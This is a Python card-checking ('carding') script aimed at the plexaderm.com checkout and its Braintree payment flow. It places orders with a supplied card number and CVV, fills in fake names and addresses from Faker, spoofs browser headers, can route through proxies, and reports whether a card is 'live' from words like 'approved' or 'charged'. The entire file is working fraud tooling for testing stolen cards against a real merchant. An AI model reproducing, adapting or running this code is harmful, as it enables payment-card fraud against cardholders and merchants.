import requests, re, base64, random, json, time
from faker import Faker
fake = Faker()

def random_hex(length=32):
    return ''.join(random.choices('0123456789abcdef', k=length))

def random_guid():
    return f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"

def get_braintree_token(session, order_id):
    headers = {
        'authority': 'plexaderm.com',
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.9',
        'referer': 'https://plexaderm.com/checkout/plexaderm/step4',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': session.headers['User-Agent'],
        'x-requested-with': 'XMLHttpRequest',
    }
    params = {'orderId': order_id}
    try:
        resp = session.get('https://plexaderm.com/data/GetBraintreeClientToken', params=params, headers=headers, timeout=15)
        data = resp.json()
        encoded_token = data.get('token')
        if encoded_token:
            decoded_token = base64.b64decode(encoded_token).decode('utf-8')
            token_data = json.loads(decoded_token)
            return token_data.get('authorizationFingerprint')
    except:
        pass
    return None

def tokenize_card(session, auth_fingerprint, card_number, exp_month, exp_year, cvv):
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'authorization': f'Bearer {auth_fingerprint}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': session.headers['User-Agent']
    }
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "dropin2",
            "sessionId": random_guid()
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": card_number,
                    "expirationMonth": exp_month,
                    "expirationYear": exp_year,
                    "cvv": cvv
                },
                "options": {"validate": False}
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    resp = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=payload, timeout=15)
    try:
        return resp.json()['data']['tokenizeCreditCard']['token']
    except:
        return None

def check_b3_5(cc, month, year, cvv, proxy=None):
    """
    Returns (is_live: bool, message: str)
    """
    try:
        card_number = cc
        exp_month = month.zfill(2)
        exp_year_full = year if len(year) == 4 else f"20{year}"

        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7'
        })
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}

        # 1. Home page + add to cart
        resp = session.get('https://www.plexaderm.com/', timeout=15)
        mvisit = session.cookies.get('mvisit') or str(random.randint(10**15, 10**16-1))

        cart_headers = {
            'authority': 'www.plexaderm.com',
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://www.plexaderm.com',
            'referer': 'https://www.plexaderm.com/',
            'user-agent': session.headers['User-Agent']
        }
        cart_data = {'items': [{'productId': 154562, 'quantity': 1}], 'withCartReset': False}
        cart_resp = session.post('https://www.plexaderm.com/api/cart/add', headers=cart_headers, json=cart_data, timeout=15)
        order_id = cart_resp.json().get('orderNumber') if cart_resp.status_code == 200 else None
        if not order_id:
            return False, "Failed to create order"

        # 2. Step1 – extract form fields
        step1_url = f'https://plexaderm.com/checkout/plexaderm/step1?m={mvisit}'
        step1_resp = session.get(step1_url, timeout=15)
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(step1_resp.text, 'html.parser')

        form_data = {}
        for inp in soup.find_all('input', type='hidden'):
            if inp.get('name') and inp.get('value'):
                form_data[inp['name']] = inp['value']

        # cart JSON
        current_cart_match = re.search(r'var ___currentCart = (\[.*?\]);', step1_resp.text, re.DOTALL)
        if current_cart_match:
            try:
                current_cart = json.loads(current_cart_match.group(1))
                for idx, item in enumerate(current_cart):
                    form_data[f'CartOffers[{idx}].OfferId'] = str(item['offerId'])
                    form_data[f'CartOffers[{idx}].OfferName'] = item['offerName']
                    form_data[f'CartOffers[{idx}].Quantity'] = str(item['quantity'])
            except: pass

        # page offers
        page_offers_match = re.search(r'var ___pageOffers = (\[.*?\]);', step1_resp.text, re.DOTALL)
        if page_offers_match:
            try:
                page_offers = json.loads(page_offers_match.group(1))
                for idx, item in enumerate(page_offers):
                    form_data[f'PageOffers[{idx}].OfferId'] = str(item['offerId'])
                    form_data[f'PageOffers[{idx}].OfferName'] = item['name']
                    form_data[f'PageOffers[{idx}].Quantity'] = '0'
            except: pass

        # Set fixed values
        form_data.update({
            'ContainsCreditCard': 'True',
            'ContainsShippingData': 'True',
            'ContainsBillingData': 'True',
            'ContainsPromoCode': 'True',
            'AutoDetectCreditCardType': 'True',
            'HasFinalCheckoutButton': 'True',
            'ContainsGift': 'False',
            'ContainsAdditionalData': 'False',
            'ContainsGiftCard': 'False',
            'IsEmailConfirmationRequired': 'False',
            'IsHidePayPalForMultiPay': 'False',
            'ShowCheckoutConfirm': 'False',
            'PaymentMethod': 'card',
            'MailingListAgreement': 'true',
            'SmsListAgreement': 'false',
            'PromoCode': '',
            'IsZipMismatchConfirmed': 'true',
        })

        # Random user info
        fname, lname = fake.first_name(), fake.last_name()
        email = fake.email()
        phone = fake.phone_number()[:10]
        address = fake.street_address()
        city = fake.city()
        zipcode = fake.postcode()[:5]

        shipping = {
            'ShippingFirstName': fname,
            'ShippingLastName': lname,
            'ShippingEmail': email,
            'ShippingPhone': phone,
            'ShippingAddress1': address,
            'ShippingAddress2': '',
            'ShippingZip': zipcode,
            'ShippingCity': city,
            'ShippingStateId': '34',
            'ShippingCountryId': '1',
        }
        form_data.update(shipping)

        billing = {
            'BillingSameAsShipping': 'true',
            'BillingFirstName': fname,
            'BillingLastName': lname,
            'BillingEmail': email,
            'BillingPhone': phone,
            'BillingAddress1': address,
            'BillingAddress2': '',
            'BillingZip': zipcode,
            'BillingCity': city,
            'BillingStateId': '34',
            'BillingCountryId': '1',
        }
        form_data.update(billing)

        # 3. Get Braintree token
        auth = get_braintree_token(session, order_id)
        if not auth:
            return False, "Braintree token missing"

        # 4. Tokenize card
        token = tokenize_card(session, auth, card_number, exp_month, exp_year_full, cvv)
        if not token:
            return False, "Tokenization failed"

        # 5. Set token and card metadata
        form_data['Token'] = token
        form_data['CreditCardNumber'] = ''
        form_data['CreditCardMonth'] = exp_month
        form_data['CreditCardYear'] = exp_year_full
        form_data['CreditCardSecurityCode'] = ''
        form_data['CreditCardBin'] = card_number[:6]
        form_data['CardType'] = 'Visa' if card_number[0] == '4' else ('Mastercard' if card_number[0] == '5' else 'American Express')

        # 6. Submit to step4
        step4_url = f'https://plexaderm.com/checkout/plexaderm/step4?m={mvisit}'
        checkout_headers = {
            'authority': 'plexaderm.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://plexaderm.com',
            'referer': step1_url,
            'user-agent': session.headers['User-Agent']
        }
        resp = session.post(step4_url, headers=checkout_headers, data=form_data, timeout=30, allow_redirects=True)

        # 7. Parse result
        html = resp.text
        # Try different extraction methods
        msg = None
        jdialog = re.search(r'JDialog\(\s*[\'"]([^\'"]+)[\'"]', html)
        if jdialog:
            msg = jdialog.group(1)
        if not msg:
            err_div = re.search(r'<div class="errorMessage">(.*?)</div>', html, re.DOTALL)
            if err_div:
                msg = err_div.group(1).strip()
        if not msg:
            result_input = re.search(r'<input type="hidden" id="OrderValidationResult" value="([^"]+)"', html)
            if result_input:
                msg = result_input.group(1)
        if not msg:
            msg = "No response"

        # Determine if live
        live_indicators = ["approved", "charged", "success", "thank you"]
        is_live = any(ind in msg.lower() for ind in live_indicators)
        return is_live, msg

    except Exception as e:
        return False, str(e)[:200]
